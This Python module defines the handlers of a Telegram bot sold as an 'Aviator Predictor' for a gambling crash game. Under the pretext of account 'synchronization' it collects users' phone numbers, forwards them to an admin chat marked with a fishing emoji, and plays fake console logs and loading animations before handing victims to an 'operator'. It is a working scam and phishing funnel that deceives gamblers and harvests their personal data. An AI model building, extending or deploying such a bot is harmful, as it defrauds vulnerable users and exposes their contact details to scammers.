import json
import os
import logging
from aiogram import Dispatcher, types
from aiogram.filters import CommandStart, BaseFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from config import SECRET_PASSWORD, CHAT_ID
from database import save_user, check_user_registration, get_user
from phonenumbers import geocoder
import phonenumbers
from animations import loading_animation, fake_console_logs

logger = logging.getLogger(__name__)

# Фильтр для исключения админского чата
class NotAdminChatFilter(BaseFilter):
    async def __call__(self, message: types.Message) -> bool:
        return str(message.chat.id) != CHAT_ID

class AuthState(StatesGroup):
    waiting_for_password = State()
    waiting_for_sync = State()

# Маппинг стран на языки
COUNTRY_TO_LANG = {
    "Russia": "ru",
    "United States": "en",
    "United Kingdom": "en",
    "Spain": "es",
    # Добавьте другие страны и языки по необходимости
}

# Папка с JSON-переводами
LANG_DIR = "lang"

def load_language_messages(lang_code):
    """Загружает сообщения из JSON для указанного языка, дефолт — английский."""
    try:
        file_path = os.path.join(LANG_DIR, f"{lang_code}.json")
        if not os.path.exists(file_path):
            logger.warning(f"Язык {lang_code} не найден, использую en")
            file_path = os.path.join(LANG_DIR, "en.json")
        with open(file_path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Ошибка загрузки языка {lang_code}: {e}")
        return {
            "welcome": "@{username}, you have successfully registered in Aviator Predictor! Contact the operator for further instructions.",
            "final_welcome": "🎉 You have successfully registered in Aviator Bot!",
            "already_registered": "🔍 You are already registered!",
            "enter_password": "🔐 Enter password:",
            "password_correct": "✅ Password correct! Synchronize your account:",
            "password_incorrect": "❌ Wrong password. Try again:",
            "sync": "🔄 Synchronize your account",
            "total": [
                "🎯 Here's your total!",
                "🚀 Catch the moment!",
                "✅ Your total is ready!",
                "🔥 Total delivered!",
                "💥 Check this out!",
                "🌟 Your result is here!",
                "⚡ Total incoming!",
                "🎰 Ready for the total?",
                "🏆 Here it comes!",
                "🎉 Total for you!"
            ],
            "error": [
                "🤖 Neural networks can make mistakes, it's okay!",
                "⚠️ Something went wrong, try again!",
                "📞 Contact support."
            ]
        }

def get_country_name(phone_number):
    """Получает название страны по номеру телефона."""
    try:
        parsed_number = phonenumbers.parse(phone_number)
        country = geocoder.description_for_number(parsed_number, "en")
        logger.info(f"Страна для {phone_number}: {country}")
        return country if country else "Unknown"
    except phonenumbers.NumberParseException as e:
        logger.error(f"Ошибка определения страны для {phone_number}: {e}")
        return "Unknown"

def get_user_language(country):
    """Определяет язык пользователя на основе страны."""
    return COUNTRY_TO_LANG.get(country, "en")

def register_user_handlers(dp: Dispatcher, bot):
    """Регистрирует пользовательские обработчики."""
    logger.info("Регистрация пользовательских обработчиков в user_bot.py")

    @dp.message(NotAdminChatFilter(), CommandStart())
    async def start_handler(message: types.Message, state: FSMContext):
        telegram_id = message.from_user.id
        logger.info(f"/start от user_id={telegram_id}, chat_id={message.chat.id}")

        try:
            if check_user_registration(telegram_id):
                user = get_user(telegram_id)
                if not user:
                    logger.error(f"Пользователь {telegram_id} зарегистрирован, но не найден")
                    await message.answer("❌ Error, try again")
                    return
                country = user[3] or "Unknown"
                lang_code = get_user_language(country)
                messages = load_language_messages(lang_code)
                await message.answer(messages["already_registered"])
                return

            logger.info(f"Начало регистрации для user_id={telegram_id}")
            await state.set_state(AuthState.waiting_for_password)
            messages = load_language_messages("en")  # Используем английский для начального сообщения
            await message.answer(messages["enter_password"])
        except Exception as e:
            logger.error(f"Ошибка обработки /start для user_id={telegram_id}: {e}")
            await message.answer("❌ Error, try again")

    @dp.message(AuthState.waiting_for_password)
    async def password_handler(message: types.Message, state: FSMContext):
        telegram_id = message.from_user.id
        logger.info(f"Пароль от user_id={telegram_id}")
        try:
            messages = load_language_messages("en")  # Используем английский для сообщений о пароле
            if message.text == SECRET_PASSWORD:
                await state.set_state(AuthState.waiting_for_sync)
                keyboard = InlineKeyboardMarkup(
                    inline_keyboard=[
                        [InlineKeyboardButton(text="🔄 Synchronize", callback_data="request_sync")]
                    ]
                )
                await message.answer(messages["password_correct"], reply_markup=keyboard)
            else:
                await message.answer(messages["password_incorrect"])
        except Exception as e:
            logger.error(f"Ошибка обработки пароля для user_id={telegram_id}: {e}")
            await message.answer("❌ Error, try again")

    @dp.callback_query(lambda c: c.data == "request_sync")
    async def request_sync_handler(callback: types.CallbackQuery, state: FSMContext):
        telegram_id = callback.from_user.id
        logger.info(f"Запрос синхронизации от user_id={telegram_id}")
        try:
            messages = load_language_messages("en")  # Английский для запроса синхронизации
            keyboard = types.ReplyKeyboardMarkup(
                keyboard=[[types.KeyboardButton(text="🔄 Synchronization", request_contact=True)]],
                resize_keyboard=True,
                one_time_keyboard=True
            )
            # Отправляем новое сообщение вместо редактирования
            await callback.message.answer(messages["sync"], reply_markup=keyboard)
            # Удаляем старое сообщение с inline-кнопкой
            await callback.message.delete()
            await callback.answer()
        except Exception as e:
            logger.error(f"Ошибка обработки синхронизации для user_id={telegram_id}: {e}")
            await callback.message.answer("❌ Error, try again")
            await callback.message.delete()

    @dp.message(AuthState.waiting_for_sync)
    async def sync_handler(message: types.Message, state: FSMContext):
        telegram_id = message.from_user.id
        logger.info(f"Синхронизация от user_id={telegram_id}")
        try:
            if not message.contact:
                logger.warning(f"Нет контакта от user_id={telegram_id}")
                messages = load_language_messages("en")  # Английский для ошибки
                await message.answer(messages["sync"])
                return

            phone = message.contact.phone_number
            username = message.from_user.username or "NoName"
            country = get_country_name(phone)
            lang_code = get_user_language(country)
            messages = load_language_messages(lang_code)

            if save_user(telegram_id, username, phone, country):
                try:
                    # Отправка уведомления в админский чат
                    await bot.send_message(
                        CHAT_ID,
                        f"🎣 Новый пользователь зарегистрирован!\n"
                        f"🆔 ID: <code>{telegram_id}</code>\n"
                        f"👤 Username: @{username}\n"
                        f"📱 Number: <code>{phone}</code>",
                        parse_mode="HTML"
                    )
                    logger.info(f"Уведомление отправлено в CHAT_ID={CHAT_ID} для user_id={telegram_id}")
                except Exception as e:
                    logger.error(f"Ошибка уведомления в CHAT_ID={CHAT_ID} для user_id={telegram_id}: {e}")

                # Показываем анимацию синхронизации
                try:
                    await loading_animation(message)
                    await fake_console_logs(message)
                    logger.info(f"Анимация синхронизации показана для user_id={telegram_id}")
                except Exception as e:
                    logger.error(f"Ошибка анимации для user_id={telegram_id}: {e}")

                # Отправляем сообщение с обращением к оператору
                welcome_message = messages["welcome"].format(username=username)
                await message.answer(welcome_message)

                # Финальное сообщение о регистрации
                await message.answer(messages["final_welcome"])
            else:
                logger.warning(f"Ошибка сохранения user_id={telegram_id}, возможно дубликат")
                await message.answer(messages["already_registered"])

            await state.clear()
            await message.answer("✅ Registration complete!", reply_markup=ReplyKeyboardRemove())
        except Exception as e:
            logger.error(f"Ошибка обработки синхронизации для user_id={telegram_id}: {e}")
            await message.answer("❌ Error, try again")
            await state.clear()
            await message.answer("❌ Registration failed!", reply_markup=ReplyKeyboardRemove())